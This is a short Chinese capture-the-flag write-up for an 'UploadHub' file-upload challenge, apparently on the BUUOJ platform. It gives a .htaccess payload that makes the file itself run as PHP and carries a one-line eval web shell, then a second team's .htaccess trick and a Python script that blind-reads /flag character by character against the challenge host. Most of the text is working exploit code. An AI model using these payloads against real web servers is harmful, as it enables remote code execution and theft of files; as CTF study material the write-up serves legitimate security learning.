## UploadHub
apache配置文件设置了上传的目录不已php解析，但是管不到`.htaccess`文件，在`.htaccess`中设置以php解析`.htaccess`即可

![](attachments/Pasted%20image%2020240401170031.png)

```PHP
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST['cmd']);?>
```

好像会定期删文件直接写操作会比较好

![](attachments/Pasted%20image%2020240401171200.png)

这里记录Nu1L的做法
上传.htaccess

```
<If "file('/flag')=~ '/flag{/'">
ErrorDocument 404 "wupco"
</If>
```

盲注
```python
import requests
import string
import hashlib
ip = '74310c5695d734e667dc2250a05dcd29'//修改成自己的
print(ip)

def check(a):
    htaccess = '''
    <If "file('/flag')=~ /'''+a+'''/">
    ErrorDocument 404 "wupco6"
    </If>
    '''
    resp = requests.post("http://ec19713a-672c-4509-bc22-545487f35622.node3.buuoj.cn/index.php?id=69660",data={'submit': 'submit'}, files={'file': ('.htaccess',htaccess)} )
    a = requests.get("http://ec19713a-672c-4509-bc22-545487f35622.node3.buuoj.cn/upload/"+ip+"/a").text

    if "wupco" not in a:
        return False
    else:
        print(a)
        return True
flag = "flag{"
check(flag)

c = string.ascii_letters + string.digits + "\{\}"
for j in range(32):
    for i in c:
        print("checking: "+ flag+i)
        if check(flag+i):
            flag = flag+i
            print(flag)
            break
        else:
            continue

```
